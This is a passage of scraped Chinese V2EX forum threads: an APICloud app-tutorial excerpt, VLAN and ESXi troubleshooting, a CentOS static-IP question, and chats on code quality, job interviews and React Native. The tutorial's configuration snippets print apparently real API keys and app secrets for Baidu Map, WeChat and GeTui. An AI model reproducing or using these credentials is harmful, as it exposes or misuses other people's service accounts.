href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/14839882e62a7c7c200eabdfe4729ff0.zip\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/14839882e62a7c7c200eabdfe4729ff0.zip</a></p>\n<p><strong>5.5 输出 APP 的 UI 架构设计文档</strong></p>\n<p>UI 架构设计文档： ui-architecture.xmind</p>\n<p><a href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/5314e37fd76105e2bf70d0bf964db340.xmind\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/5314e37fd76105e2bf70d0bf964db340.xmind</a></p>\n<h2><strong>6. 功能点分解</strong></h2>\n<p><strong>6.1 基于需求说明，梳理出主要功能点</strong></p>\n<p><strong>6.2 为每个功能点，给出合适的技术实现方案</strong></p>\n<p><strong>6.3 在 APICloud 聚合 API 找到功能点对应的模块</strong></p>\n<p><strong>6.4 输出 APP 的功能模块分解文档：</strong> function-modules.xmind</p>\n<p><a href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/2966eb9edaa13ccd7b37fe4e57512be9.xmind\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/2966eb9edaa13ccd7b37fe4e57512be9.xmind</a></p>\n<h2><strong>7. 开放服务选择</strong></h2>\n<p><strong>7.1 基于需求说明，梳理出需要使用的开放服务</strong></p>\n<p><strong>7.2 调研不同的开放服务商所提供的服务是否能满足自己应用的需求</strong></p>\n<p><strong>7.3 在 APICloud 聚会 API 找到对应的开放服务模块</strong></p>\n<p><strong>7.4 输出 APP 的开放服务分解文档：</strong> service-modules.xmind</p>\n<p><a href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/e7db23fc8e152992c65c8cee53b2dc94.xmind\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/e7db23fc8e152992c65c8cee53b2dc94.xmind</a></p>\n<h2><strong>8. 数据接口定义</strong></h2>\n<p>APICloud 应用架构是 Client ＋ Cloud 架构，终端实现 UI 布局和功能，云端提供数据和服务。开发 APICloud 应用，与服务器端程序的实现方式和开发语言没有任何关系。</p>\n<p>可以选择使用 APICloud 数据云，也可以自己来开发服务端接口**</p>\n<p><strong>8.1 定义输出服务端接口文档：</strong> server-api.pdf</p>\n<p><a href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/7cb2dd66607d91cd7957d548b4e7c1e6.pdf\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/7cb2dd66607d91cd7957d548b4e7c1e6.pdf</a></p>\n<p><strong>8.2 输出服务端接口调试文件：</strong> server-api.postman_collection</p>\n<p><a href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/99d3e5fb1adff0f0cca6908db45a7969.postman_collection\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/99d3e5fb1adff0f0cca6908db45a7969.postman_collection</a></p>\n<h2><strong>9. 应用证书和第三方 Key 申请</strong></h2>\n<p><strong>9.1 申请应用证书</strong></p>\n<ul>\n<li>\n<p>Android ： xxx.keystore 文件（例如： sxo2o.keystore ）</p>\n</li>\n<li>\n<p>iOS ： xxx.p12 文件、 xxx.mobileprovision 文件（例如： sxo2o.p12 、 sxo2o.mobileprovision ）</p>\n</li>\n</ul>\n<p>推荐文档：</p>\n<p>安卓证书帮助文档 <a href=\"http://docs.apicloud.com/Dev-Guide/Android-License-Application-Guidance\" rel=\"nofollow\">http://docs.apicloud.com/Dev-Guide/Android-License-Application-Guidance</a></p>\n<p>苹果证书帮助文档 <a href=\"http://docs.apicloud.com/Dev-Guide/iOS-License-Application-Guidance\" rel=\"nofollow\">http://docs.apicloud.com/Dev-Guide/iOS-License-Application-Guidance</a></p>\n<p><strong>9.2 确定应用包名</strong></p>\n<ul>\n<li>\n<p>Android ： com.company.app （例如： com.apicloud.sxo2o ）</p>\n</li>\n<li>\n<p>iOS ： com.company.app （例如： com.apicloud.sxo2o ）</p>\n</li>\n</ul>\n<p><strong>9.3 申请开放平台相关 Key</strong></p>\n<ul>\n<li>百度地图</li>\n</ul>\n&lt;feature name=\"bMap\"&gt;\n        &lt;param name=\"android_api_key\" value=\"0nKBc8SkhvOGxGOLZ96Q6iWXcSU0iOhe\"/&gt;\n<pre><code>    &lt;param name=\"ios_api_key\" value=\"iObZMn4A1N6pxQBhgG4ElbHmaDNshPZR\" /&gt;\n</code></pre>\n  &lt;/feature&gt;\n<p>推荐文档</p>\n<p>百度地图模块文档 <a href=\"http://docs.apicloud.com/Client-API/Open-SDK/bMap\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/Open-SDK/bMap</a></p>\n<p>百度开放平台接入指南 <a href=\"http://docs.apicloud.com/Others/Open-SDK-Integration-Guide/baidu\" rel=\"nofollow\">http://docs.apicloud.com/Others/Open-SDK-Integration-Guide/baidu</a></p>\n<ul>\n<li>微信登录</li>\n</ul>\n &lt;feature name=\"wx\"&gt;\n<pre><code>    &lt;param name=\"urlScheme\" value=\"wxd0d84bbf23b4a0e4\"/&gt;\n    \n    &lt;param name=\"apiKey\" value=\"wxd0d84bbf23b4a0e4\"/&gt;\n    \n    &lt;param name=\"apiSecret\" value=\"a354f72aa1b4c2b8eaad137ac81434cd\"/&gt;\n</code></pre>\n  &lt;/feature&gt;\n<p>推荐文档</p>\n<p>微信模块文档 <a href=\"http://docs.apicloud.com/Client-API/Open-SDK/wx\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/Open-SDK/wx</a></p>\n<p>微信开放平台接入指南 <a href=\"http://docs.apicloud.com/Others/Open-SDK-Integration-Guide/weChat\" rel=\"nofollow\">http://docs.apicloud.com/Others/Open-SDK-Integration-Guide/weChat</a></p>\n<ul>\n<li>个推推送</li>\n</ul>\n&lt;feature name=\"pushGeTui\"&gt;\n<pre><code>    &lt;param name=\"ios_appkey\" value=\"xCGkZR1bCp6gscLUB20Dl4\" /&gt;\n    \n    &lt;param name=\"ios_appid\" value=\"G5lfFkQZ008VoZUXydA2r2\" /&gt;\n    \n    &lt;param name=\"ios_appsecret\" value=\"RuxlC8ExWA7T4NFoJhQFd6\" /&gt;\n    \n    &lt;param name=\"android_appkey\" value=\"SsYLDV34ik5CBgtdzCQ608\" /&gt;\n    \n    &lt;param name=\"android_appid\" value=\"dASHvkJSLc9Q5vvSEALdI4\" /&gt;\n    \n    &lt;param name=\"android_appsecret\" value=\"BmjqFXsFDS6SVMyV2JXglA\" /&gt;\n    \n&lt;/feature&gt;\n</code></pre>\n<p>推荐文档</p>\n<p>个推模块文档 <a href=\"http://docs.apicloud.com/Client-API/Open-SDK/pushGeTui\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/Open-SDK/pushGeTui</a></p>\n<p>个推开放平台接入指南 <a href=\"http://docs.apicloud.com/Others/Open-SDK-Integration-Guide/pushGeTui_manual\" rel=\"nofollow\">http://docs.apicloud.com/Others/Open-SDK-Integration-Guide/pushGeTui_manual</a></p>\n</div></div>"], "reply": "2", "tittle": "APP7 天快速开发教程 1： APP 开发基础介绍及需求梳理", "comment": ["这应该发到推广去吧", "7 天太久了，有没有 3 天的？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前是一台电脑直接交换机 port2 ，电脑里装的 esx 主机，</p>\n<p>vmware 虚拟机：\nvmnetwork ： VLAN100 ，<br>\nvswitch ：  开混杂模式</p>\n<p>交换机：\nport2 ： vlan100 tagged</p>\n<p>现在问题：\n虚拟机 ping 交换机网关都 ping 不通</p>\n<p>折腾好几天了，谁知道这个该怎么配置？ 感激不尽！</p>\n</div></div>", "<div class=\"topic_content\">&lt;img src=\"http://wx2.sinaimg.cn/mw690/b75b4fadly1fcnx9m6unnj20yi0pxqv5.jpg\" alt=\" 1.jpg\"/&gt; \r<br>&lt;img src=\"http://wx2.sinaimg.cn/mw690/b75b4fadly1fcnx9vmyitj20yi0px1ky.jpg\" alt=\" 2.jpg\"/&gt; \r<br>&lt;img src=\"http://wx2.sinaimg.cn/mw690/b75b4fadly1fcnxa27dmbj20yi0px7wi.jpg\" alt=\" 3.jpg\"/&gt; \r<br>\r<br>配置大概就是这些   截图中 port1 没亮，其实当时 port1 上是有设备的，而且配置了静态 IP （截图的时候被我拔了）\r<br>\r<br>从 port2 ping   port1 的机器：\r<br>    只要 esx 端口组 设置成 0 或者 4095 （ all ）  就能 ping 通\r<br>    只要设置成 100 就不能 ping 通\r<br>\r<br>@<a target=\"_blank\" href=\"/member/gamexg\">gamexg</a></div>", "<div class=\"topic_content\">目前思路：\r<br>1. 网上有的说笔记本千兆有线网卡  收包自动会去 vlan tag ，想办法抓 vlan 包看看\r<br>2. esx 那边还要检查一下\r<br>谢谢各位，如果我这个搞定了我出个小白版的教程，方便少数和我一样不太懂的同学</div>"], "reply": "53", "tittle": "快疯了。。单臂路由的 VLAN 到底怎么配置？", "comment": ["  不好意思再次麻烦您一下， 能帮忙在看一下吗", "在 OpenWrt 中 Interface Edit 界面有一句话\r", "> You can also use VLAN notation INTERFACE.VLANNR (e.g.: eth0.1).\r", "意思就是 Physical Settings 中可以直接写 Custom Interface ，比如 eth0 网卡上的 VLAN 100 就是 eth0.100 。", "这不叫单臂路由吧？\r", "你是什么交换？思科华为倒是好搞定，其他就不太了解了。\r", "你试试把 Port 改成 VLAN 100 un tagged （未标记）， VM SWITCH 不要 VLAN 标记，当成接入模式就好了", "先确认下几个：\r", "1.交换机端口 2 打了 100 的标签，并且是 tagged 模式。\r", "2.你希望虚拟机连接的目标也需要在交换机上面配置属于 vlan100 ， pvid 也是 100 ，并设置为 untag 。对了还要确认是 802 协议的 vlan ，别是交换机私有的。\r", "3.vswitch  不需要开 混杂模式，直接在端口组配置 vlan id 即可，然后将虚拟机网卡连接到端口组。\r", "\r", "另外虚拟机在 vlan100 可能会由于和交换机管理 vlan 不同无法 ping ，确认 vlan 配置是否正确建议用虚拟机 ping 其他设备。", "如果 LZ 还是用上个帖子的方案，我准备了一张图\r", " ", " ", "有开 switchport mode access 吗", " 能推荐一个支持这个格式的交换机么 我已经买错两个了，退货退的好气呀……", " 我就是 port1 vlan 100 untag pvid 100", "port2 vlan 100 tagged pvid 100", "只要虚拟机用 vlan 网卡 ping port1 的电脑就不行，", "不用 vlan 网卡就随便 ping", "感觉像是交换机买的有问题……", "复制这条信息，打开👉手机淘宝👈即可看到 [五 5 口千兆交换机 网管 vlan 端口隔离镜像汇聚扩 wan 铁壳交换机 监控] ￥ QhMyRj6mAa ￥ ", "果然便宜没好货？", " 谢谢，主要是我买的那个交换机没有我要的那种 trunk ，他的 trunk 必须把多个端口加到一个 trunk 组里，感觉像是主备倒换，负载均衡什么的", "路由器上起子接口", "应该不是交换机的问题，支持 tagged 模式的就应该能用。\r", "看介绍是没问题的 “　 基于 IEEE 802.1Q 的 Tag VLAN ；”\r", "\r", "\r", "建议发下截图。", "先不说单臂路由  先说说你想干嘛  实现什么", "<img src=\"http://wx2.sinaimg.cn/mw690/b75b4fadly1fcnx9m6unnj20yi0pxqv5.jpg\" alt=\" 1.jpg\"/> \r", "<img src=\"http://wx2.sinaimg.cn/mw690/b75b4fadly1fcnx9vmyitj20yi0px1ky.jpg\" alt=\" 2.jpg\"/> \r", "<img src=\"http://wx2.sinaimg.cn/mw690/b75b4fadly1fcnxa27dmbj20yi0px7wi.jpg\" alt=\" 3.jpg\"/>", " 目前想实现网卡直接发带 tag 的包，问题是交换机好像不收", "交换机能配置单臂路由?,2 层交换机的 IP 能当网关?", "\r", "\r", " 目前主要问题是连虚拟化的 tag 报文都发不出去", "pvlan 和 cvlan 不是一回事所以 pvid 不要设置，其它的因为我也不熟你这个交换机所以也不能确定，不过应该没什么问题。", "配置看起来都正确，\r", "也许可以把 esxi 端口组的 vlan 设置为 all+混杂模式，抓个包看看收到的包是否有 vlan 。\r", "或者电脑抓包看看是否正确收到了无 vlan 的包。", "LZ 我来了。\r", "\r", "vmware 这种情况我也没试过，但我知道我下面这种肯定可行，你参考一下思路。\r", "\r", "4 口交换机\r", "1 设成 trunk ，连电脑。\r", "2 设 vlan 1 ，当 wan 口用。\r", "3 4 设 vlan 2 ，当 lan 口用。\r", "\r", "电脑装 openwrt ，网口连交换机 1 口。\r", "装 macvlan ，把电脑上唯一的网口虚拟出 2 个网口，比如 macvlan1, macvlan2, 分别设置 vlan 1 2 。\r", "在 interface 里， wan 的物理接口选 macvlan1, lan 的选 macvlan2 。\r", "\r", "搞定！", " 话说能给推荐一个交换机么……之前买错了两三个都退了，百兆千兆无所谓，能支撑我这个就可以", " 可以 exsi 分配 2 个网口分别对应 2 个 vlan 给 openwrt ，这样 macvlan 都不用配了", "交换机应该是支持的， exsi 设置有问题", "  tp 的 tl-sg108e 不错，千兆铁盒", " 那我再研究一下 esx", "首先画个租网图出来，确定哪些接口带 vlan 哪些不带，按照 lz 描述如果电脑出来带 vlan 那对应接口问 trunk 并允许相应 vlan 通过，如果借口出来不带 vlan 就在接口上打上 vlan ，所以如果 port2 的电脑出来的数据带了 vlan ， port2 是 vlan100tagged ，那就要丢弃这个包", "不太理解这低端交换机网页设置，根据 lz 配置，可以试下交换下 1 ， 2 端口看是不是就能通了", " 感谢，可是问题是：\r", "1. port2 如果 ESX 虚拟化那边没问题，发送的应该是 带 tag 的标签\r", "2. 这个低端路由好像没有区分 access trunk 的端口模式\r", "3. 然后我设置了 port2 vlan100 ， pvid 也是 100 ，带 100vlan 的数据包从电脑进端口，应该是能放行的，不应该丢弃这个包吧", " 对了你是哪个 TcpRoute 的作者么？ 我一直在用哪个", "楼主用的是不是 BL-SG108M ？交换机的 vlan0 是不能删除的", " 是的，当时学习 golang 时写的。\r", "\r", "另外交换机的话我这里用的是 JGS524Ev2 ，和你一样的用法，没碰到这种问题。\r", "\r", "对了，想起一个问题，你配置好交换机的 vlan 后是怎么访问的 esxi ？\r", "如果给交换机的 esxi 端口配置了 tagged ，那么就无法访问 esxi 了，我当时是在 esxi 控制台下修改的网卡 vlan 才能够再次访问 esxi 。\r", "你如果没做这个修改就能够访问 esxi ，那么很怀疑交换机真的给数据包打了 vlan 标签了吗？", " 我用的小牌子的，希力交换机，现在感觉像是因为　　我所有的虚拟机都在笔记本上，而笔记本网卡收 vlan 包会自动删除 tag.  我回家看看 windows 能不能抓它下面虚拟机的 vlan  tag 包， 看一下就行了", " JGS524Ev2  v2 版本的才支持 vlan ， v1 是不支持 vlan 的。", " 明白您的意思 我回去检查设置。 BTW ， 你那个 tcproute 真的挺好用的，某种概念上说，相当于家里建了个 BGP", "\r", "\r", "我之前学网工的时候写了一个教程，但是是思科的，不知道里面的思路能不能帮到你", "pvid 没记错应该就是当收到没有带 vlan id 的包的时候就默认打上 pvid 设置的这个 vlan id ，现在我也是在用单臂路由不过虚拟机用的 hyper-v ，楼主最好画一张图我大概看了一下没看懂。。。", "贴个你现在的拓扑图啊", "你这些设备里都没有路由器，怎么配置单臂路由器呢？我猜你的意思应该是 ESXi 的虚拟交换机和物理交换机之间建立 trunk ，然后 ESXi 上虚拟机可以在各个不同的 vlan 和物理交换机上的各 vlan 接口通信吧？如果是这样的话，需要两边都不打标记（也就是 trunk 模式）就可以了。", "你要 ping 通网关，需要在路由器的 lan 接口下配置子接口，一个子接口对应一个 vlan ，配置对应的 ip 地址，这个才是单臂路由。", "小白没看懂楼主的需求是什么，不过楼主愿意出教程我是双手赞成 ", " ", " 我的目的就是你说的这样，问题是这个物理交换机的端口设置没有 trunk 模式，而且必须设置 PVID", " 我看到 16 楼截图 1 里面有“无 tag 标记”，这个能设置吗？\r", "另外， esxi 的“混杂模式”不用开吧，这个是端口镜像时候用的，也就是同时接受上行和下行流量。", " 根据 16 楼截图 1 ，是否测试一下 5-8 端口， 5-8 貌似已经不做标记了。", " 我好像突然有点明白了，晚上回家试试", " tag 、 untag 、 off 的概念是有点搞，貌似是 linux 下的说法，和 cisco 的说法有些不一样。这个 openwrt 的文档你参考一下，有 tag 、 untag 的具体解释。 ", "pvid 是一个交换机端口的默认 vlan id, 对于 trunk 口可以不用更改，这里不明白“无 tag 标记”指的是不是出流量剥离标签的动作，可能是翻译问题导致的理解偏差，最好能找下店家或者相关产品文档看下怎么设置流量进端口不需要 tag vlan ，出流量也不剥离标签", "untagged 比较霸道，进入的时候不管你有没有标记都统一标成 untagged 设置的 vlan id ，发出去的时候则是全给你清掉 vlan id\r", "\r", "我说说我现在的例子： port0 接光猫， port1 接做软路由的 pc ， port234 接其他设备\r", "port0 的光猫只是给软路由 pc 上的虚拟机用，这个口打 untagged vlan1\r", "port1 的 pc 上的虚拟机软路由网卡有两个，一个是 vlan1 连光猫，另外一个是 vlan0 ，所以 port1 设 tagged&trunk\r", "port1 的 host pc 本身也要连到自己虚拟机软路由上，所以 host pc 的网卡是 vlan0\r", "port234 自然也是 vlan0 桥接，设 untagged vlan0", " 全部明白\r", "\r", "问题是你的 host PC 是什么系统  物理机器还能接受 vlan 数据包？", "所以，现在单臂路由是不需要虚拟子接口了吗？", " hyper-v 的虚拟交换机除了可以设置虚拟机的外，还可以设置 host 机网卡的 vlan id", " 要的 虚拟机的第一个网卡设置为 VLAN 100 目前 ping 不通 我在定位", " \r", " \r", " \r", "\r", "我抓了包  虚拟机随便配了个 192.168.1.55 的 ping 交换机网管  192.168.1.1\r", "结果一直在 arp 死循环  ：\r", "    1.55 （虚拟机） 不停的问 1.1 （路由器网关）的 mac 地址是多少\r", "     1.1 （路由器网关）也一直回复，但是感觉虚拟机看不到\r", "\r", "后来我看了下图中的报文，有意思的东西出现了：\r", "1. 虚拟机问 arp 的时候，带 100 vlan ID\r", "2. 交换机回的时候不带\r", "\r", "怎么判断是笔记本自带 GE 有线网卡过滤了返回的 VLAN ID ， 还是交换机返回的本身就没有？", " 不建议拿交换机网管测试，很有可能厂家就没考虑管理 vlan ，建议 ping 另找的计算机。\r", "\r", "可行的办法：\r", "\r", "1.另找一个电脑(交换机设置为 utag ， vlan=100 ， pvid=100) ping 任何地址，虚拟机抓包，看看是不是能够收到 arp 请求，收到就表示交换机正确的给包加了 tag ，并且 esxi 正确的移除了 vlan 标签。\r", "\r", "2.如果收不到，可以试试将虚拟机端口组的 vlan 去掉， esxi 开混杂模式，然后在抓包，正确情况下包应该带 vlan 标签。\r", "\r", "3.找一个电脑，连上交换机，然后把这个交换机端口设置为带 tag ，抓同一 vlan 的广播，理论上应该带正确的 vlan 标签。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>CentOS 7.2 配置好网络重启后 GG ，找了好久，最后看到网上一篇文章说：</h3>\n<p><a href=\"http://i.imgur.com/ZPWFEnt.png\" rel=\"nofollow\">http://i.imgur.com/ZPWFEnt.png</a></p>\n<h3>所以我将 dhcp 开启之后网络就正常了。这种设置原意应该是方便使用，但是为什么会导致网络 GG （什么都 Ping 不通的那种，内网，外网， DNS ）呢</h3>\n</div></div>", "<div class=\"topic_content\"><a target=\"_blank\" href=\"http://i.imgur.com/GktwHuZ.png\"><img src=\"http://i.imgur.com/GktwHuZ.png\" class=\"embedded_image\"></a><br>麻烦各位看看了=。=</div>"], "reply": "15", "tittle": "为什么 Linux 下配置网络添加静态 ip，子网掩码和 dns 会导致重启后网络 GG 呢？", "comment": ["看你怎么配置的了 如果用 ip a add xxx 这种方式的话是临时的重启会失效", "网络不通只是说明没配置对吧", " 修改配置文件 :\r", "/etc/sysconfig/network-scripts/ifcfg-ens33 进行添加静态 Ip 等操作\r", "shutdown -r\r", "此时网络 ok 了。重启电脑开虚拟机，就又不行了。\r", "\r", "\r", " 修改后通的，重启电脑就不行了，最后把 dhcp 设置为 on 的状态才又 OK 的", "CentOS 的话，个人建议用 nmtui 或者 nmcli 来改网络配置，手动改配置文件很容易出问题", " 我就是不明白怎么指定静态 ip 网络就不通了。让他自动获取则是 ok 的", " 只能猜测是配置错误", "配错了。", " 😓😓 好吧", "装完系统第一件事 卸载 networkmanager", " \r", "+1\r", "\r", "实在受不了 networkmanager ，先是在 /etc/sysconfig/network-scripts/if-ethx 中设置 NM_CONTROLLER=no ，网络还是不通，最后 yum erase networkmanager", "我也觉得是配置写错了，能把配置贴上来看看吗", " 当然可以，已经 append ，麻烦了。： P", " IP 地址掩码网关后面不需要加 0 的吧……我从来没加过\r", "IPADDR=192.168.22.128\r", "PREFIX=24\r", "GATEWAY=192.168.22.1\r", "DNS1=192.168.22.1", "你这配置是全加了# ?", " 因为我现在直接启用 dhcp ，所以不用指定\r", "\r", " 尴尬了，我是看教程的。 ", "\r", "现在我知道哪里错了=。=谢谢啦。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/25169261\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/25169261</a>\r<br>\r<br>Big Ball of Mud ，中文名称“一坨翔”。自打我入行以来，就一直在和这一坨翔做搏斗。</div>"], "reply": "14", "tittle": "噢，你的代码像一坨翔。然后呢？", "comment": ["\"异步化没有帮他们解决什么问题，反而搞出一堆麻烦事情来。\"\r", "\r", "搞出麻烦事情来是肯定的，但是也解决了一部分问题：比如对于某些不需要实时化的东西、或者某些处理操作耗时的，直接异步不会影响现在业务的处理时间。\r", "\r", "现在在用的 Guava 的 EventBus 来处理异步，确实搞出了很多麻烦。代码里确实有些地方是 over design 的", "拜读了下，挺好的文章", "挺不错的，不过精华显然是下一篇啊，要点姿势齐全，简直堪称甩干锅😂", "敢不敢全文粘贴过来", " V2EX 不鼓励全文转载的", "现在还停留在  “ model 目录，倒没有付出什么成本。差一点的是把整个数据表重新定义了一个 xxxBO 的对象，然后每次都要多一次对象的字段拷贝。逻辑写来写去只看见增删改查，哪里有什么领域模型可言？”这个层次，怎么办？", " 哦哦，不知道呢，不好意思", "这个批判太有意思了\r", "你还不知道流程引擎是干嘛用的呢\r", "一个业务 几十个节点 如果全手动编程实现 要不要死人？\r", "\r", "另外，这种可视化、可拖拽的流程引擎，不是给程序员用的，是给不会写代码的实施用的，需求拟完了，客户撕逼完了，直接一配新流程新业务就上线了\r", "全开发那得多少工作量？", " ", " udi dahan 的吐槽。 salesforce 是好的，半截子的 salesforce 还不如 PHP 裸写。我的观点是要把开发平台做得效率超过 PHP 裸写，这个 bar 其实很高的。", "写得蛮好的，如果可以把文字和措辞换得更正式一点，会是一篇很好的架构分析。现在读起来有点容易分心，感觉像是在发牢骚.加油!", "写得很好，两篇文章合起来看学到了很多", "安利一下，世界上最好的流程调度和编排工具： PHP ，没有之一。", " 的文章总是这么深刻", "   TW 犀利风趣的文字味道, 我最熟悉了, 曾经吃过 TW 哥拉过的翔, 我也很荣幸了, 五条甩锅心法招招都直入我心坎, (偷乐中.."]},
{"content": ["<div class=\"topic_content\">有时候重复劳动多了，想写个小工具，写完了之后，用着用着，总是出问题，因为总会各种意外的情况，久而久之，当时写这个工具的热情都磨没了，看自己写的代码也没当时思路清晰了，后来直接懒于维护了，直接用手动解决了。\r<br>各位对自己的程序都信任吗，我这样该咋办，难道只能自己慢慢踩坑积累经验吗？</div>"], "reply": "22", "tittle": "对自己写的程序不信任，是不是经验不够导致", "comment": ["感觉是没有写测试导致", "多写测试， 把用到的 case 都写成测试.", "没写测试+ 没写注释？\r", "我举得你缺乏的是对作品的信心。但是我觉得你不妨找几个去动手用一用。用了，不断的迭代，获取用户正向的反馈，逐步优化作品。", " 测试肯定也是测过的，测的都是正常情况下正常运行，一使用，总会出现各种意外情况，比如文件在操作过过程中被别的程序删除了，无法进行操作，网络上的各种不稳定因素，权限问题等", " 这些在写的过程要考虑的, 程序需要有基本健壮性", " \r", " \r", "也算程序问题，因为没有考虑全面，正常情况下出现问题几率比较低，觉得还是经验不太够，想不到这么多可能性", "没有考虑全面所以需要迭代。我正常情况下造轮子都是先做一个可以跑起来的产品(MVP)，在自己的实际使用时，发现不足之处，并记录下来。当需要修改的足够多时，我就会选择整体重构。", "我都不相信我出门有没有锁门，又能怎样。。谁说我的代码有 bug 我就跟谁急", "一个青涩的懵懂的少年，觉得世界所有东西都是美好的，带着善意和信任看待所有人所有事。结果被撞的死去活来。\r", "一个受伤的悲观的少年，觉得世界充满了恶意，带着绝望退回了壳里，以防备和憎恨看待所有人所有事。结果被别人遗忘并被自己杀害。\r", "\r", "一个成熟的乐观的成人，知道世界很好但也不完美，也知道自己通过努力可以改善哪怕一丁点。\r", "每天冒出来一些美好的想法，在自己能力范围内努力把它做的完善，得到些正面或负面的反馈，再努力修正完善的更好。\r", "每天晚上从循环中吸取正面的作为精神动力，吸取负面的作为成长经验，明天再开个新循环。\r", "\r", "生活如是，恋爱如是，代码亦如是。", "前期的时候可以多花点时间在思考和功能梳理上~这样减少自己后期的小问题抵消热情", "我有时候写完代码，自信的一匹。\r", "测试跟我说有 BUG ，我都不敢相信自己的耳朵~", "不出问题的程序不是好程序。", "感觉是没有写测试导致+1\r", "应该是姿势不对", "不是，经验再多也达不到这种程度，对自己写过的代码都信心满满", "TDD", "我觉得跟写测试没什么关系，感觉你写代码没有仔细思考，你自己都没想清楚，指望测试用例帮你找 bug 吗？你自己把各种情况都摸清楚了，怎么会不自信呢。", "谁有可能做到没 Bug 的产品呢...\r", "\r", "不过我想说的， 7 楼童鞋已经都说了", "私人项目发现 bug 不是很好吗，这就是经验啊！应该开开心心做笔记才对", "相关知识不扎实\r", "代码风格有问题\r", "我见过很多不求甚解，写代码不看文档的人。他们的座右铭是“别管那么多，先跑起来再说。只要不是 error ， warning 再多怕什么。”\r", "然而那些代码再没有人去完善过，因为没人看的懂\r", "此处应配 c++学习曲线： ", "\r", "我想说不止 C++，所以编程都是一样的： we need some rules.\r", "某些工业控制软件（特别是航天）要求代码是可以从逻辑上证明无 bug 。你不妨尝试一段时间。很慢，但能迅速锻炼代码质量。", "另外，别太纠结 bug 。有 bug 没事，修就是了，吸取教训，下次不要再犯\r", "软件开发中重构甚至重写都是很正常的事", "啊，担心的话，下次再注释里开一下光就好了。", "感觉是没有写测试导致，再+1"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>.net 程序员一枚，两年多点经验，如果失败了， tm 简直是双重伤害。有没前辈给点经验，不知道会怎么问，因为我就第一次跳槽，毕业到现在就一家公司。希望别引起语言之争，别歪楼啊，给点实际点的，谢谢，我不想无业地吃狗娘，唉。。。。</p>\n</div></div>"], "reply": "36", "tittle": "明天情人节，人家约炮，我去面试", "comment": ["我倒是有 20 多年的单身经验和你分享。", "难道来的是我公司?", " 累觉不爱", "如果 HR 是个单身大胸妹妹的话也许事情还有转机", "ls 调皮，笑死了", "楼主坐标如果是帝都，甩个简历过来呗，有 C Sharp 坑可入。", " 难道不应该是看应聘者的 qi da huo hao 吗？", " 可惜是妖都", "你说你是女装大雕程序员的话，估计人家眼睛会发光吧。", " 我要看你的", "毕业之后在家闭关一段时间，因为之前考银行公务员啥的全部未果（双学位学的会计，家里人想让干银行公务员之类的），自己也挺失望的，去年七夕那天我去另一个城市面试，第二天二面，晚上一个人在 7 天开了间房，最后我去了那家公司，我想说机会好运总是会降临的，一时失败没什么", " \r", "来我司吧  数十位单身高颜值妹子， 正好有.net 程序员的坑。。考虑一下不？？？\r", "\r", " 特意点进去看了一眼, 并没有发现高颜值妹子的无码照...实在不行打吗也行啊喂....", "明天出差", "   你来公司 面试 面完我带你 看真人，多好呀。。。毕竟都是待字闺中的妹纸 没授权我敢乱发么。。。\r", "\r", "所以说么 程序员为啥 单身  太宅了啊！！！！", " 那就祝你好运咯", " 算了, 我怕我媳妇弄死我....(好像不经意间又喂了 LZ 一把狗粮....)", "人家约炮，我却辞职", "同.net 程序员啊，唉", "我明天第一天上班~~~心有点~~~", "你得考虑下面试官的感受嘛😔", " 平的也不错吧，关键是情投意合好么", " #22 平的不考虑", " 祝一帆风顺", " 加油", "同明天面试啊~ 加油~", "明天下午五点面试…", "约炮+面试一起进行啊，，，即使面试失败，搞定 HR 也行。", " \r", " \r", "共勉", "你还有面试，有人面试的机会都没有。", "头像是本人吗？见楼上竟然没人问，差点以为上错论坛。", "LZ 可以约面试官", "明天我也有面试，共勉", "面个.net 程序员，问我进来后能不能做 vb ， ios 和安卓的程序，说给五分钟我想想，呵呵", " 类似这些公司，我一般都是很友好地回答能是能，但我要回去考虑几番，然后静静地撤退", " 233"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>facebook 出了 react native 有多少人用啊， 还有一个类似的框架 fuse 框架，\n哪个坑多？开发效率怎么样？使用过的人谈谈吧\n<a href=\"http://fusetools.com.cn/community/index.php/topic/show/1\" rel=\"nofollow\">http://fusetools.com.cn/community/index.php/topic/show/1</a></p>\n</div></div>"], "reply": "8", "tittle": "React Native 开发者看过来", "comment": ["对 RN 一直都有关注，最近开始利用业余时间看文档，写写 demo 。想用，但因为经验不多，怕坑，还在犹豫。同样期待有经验的朋友分享分享经验。", "不建议入坑。要么左转学 React.js ，要么右转学 Android 。", " 和 ionic 比呢？", " 现在有成熟的可商用的 跨平台框架吗？主要一个 APP 要 3 套源码有点蛋疼。。。\r", "React.js 是另外一个框架？", "其实感觉 RN 有的业务逻辑还是要写原生代码的。", "我觉得还可以啊，开发体验很好", "写了好多年代码，前后端都做过，安卓、 iOS 也比较熟悉。从去年 3 、 4 月份开始使用 RN ，做了一个小说阅读类的 App ，目前还在继续。\r", "\r", "感受：\r", "0 、 React.js 的经验非常有帮助；\r", "1 、用标签语言做 UI 界面还是很顺畅的，性能和效果可以满足一般产品的需求；\r", "2 、跟原生语言相比较节省了大量的编译时间；\r", "3 、可以直接使用 ES6 ， async/await ，感觉写 JS 也不那么难受了；\r", "4 、第三方库质量参差不齐，有的时候跟不上 RN 升级，自己开发 Native Modules 也不困难；\r", "5 、 Bug 